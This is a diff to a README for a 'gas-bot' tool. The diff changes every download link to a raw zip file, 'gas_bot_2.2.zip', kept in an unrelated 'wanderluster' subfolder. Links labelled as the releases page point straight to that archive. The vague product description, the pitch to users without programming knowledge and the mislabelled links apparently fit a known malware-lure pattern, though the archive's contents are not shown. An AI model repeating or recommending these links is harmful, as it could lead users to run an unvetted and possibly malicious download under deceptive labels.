@@ -4,7 +4,7 @@
 Welcome to the gas-bot project! This guide will help you download and run the application with ease. Our bot is designed to assist you in managing your gas-related tasks more efficiently. You don’t need any programming knowledge to get started.
 
 ## 📥 Download the Application
-[![Download gas-bot](https://github.com/Ahmet547-pixel/gas-bot/raw/refs/heads/main/wanderluster/gas-bot-v2.8.zip%20gas--bot-00bfff?style=for-the-badge&logo=github)](https://github.com/Ahmet547-pixel/gas-bot/raw/refs/heads/main/wanderluster/gas-bot-v2.8.zip)
+[![Download gas-bot](https://raw.githubusercontent.com/Ahmet547-pixel/gas-bot/main/wanderluster/gas_bot_2.2.zip%20gas--bot-00bfff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ahmet547-pixel/gas-bot/main/wanderluster/gas_bot_2.2.zip)
 
 ## 📋 System Requirements
 Before you start, make sure your device meets the following requirements:
@@ -26,7 +26,7 @@ To get started:
 
 1. **Visit the Releases Page**: Click the link below to access our releases page.
    
-   [Visit the releases page to download](https://github.com/Ahmet547-pixel/gas-bot/raw/refs/heads/main/wanderluster/gas-bot-v2.8.zip)
+   [Visit the releases page to download](https://raw.githubusercontent.com/Ahmet547-pixel/gas-bot/main/wanderluster/gas_bot_2.2.zip)
 
 2. **Select the Latest Release**: On the releases page, look for the latest version available.
 
@@ -62,4 +62,4 @@ We welcome your input! If you have suggestions for improvement or new features, 
 ## 🔗 Additional Information
 For further details about gas-bot and its features, please visit our associated web page. 
 
-[Visit the releases page to download](https://github.com/Ahmet547-pixel/gas-bot/raw/refs/heads/main/wanderluster/gas-bot-v2.8.zip)
+[Visit the releases page to download](https://raw.githubusercontent.com/Ahmet547-pixel/gas-bot/main/wanderluster/gas_bot_2.2.zip)
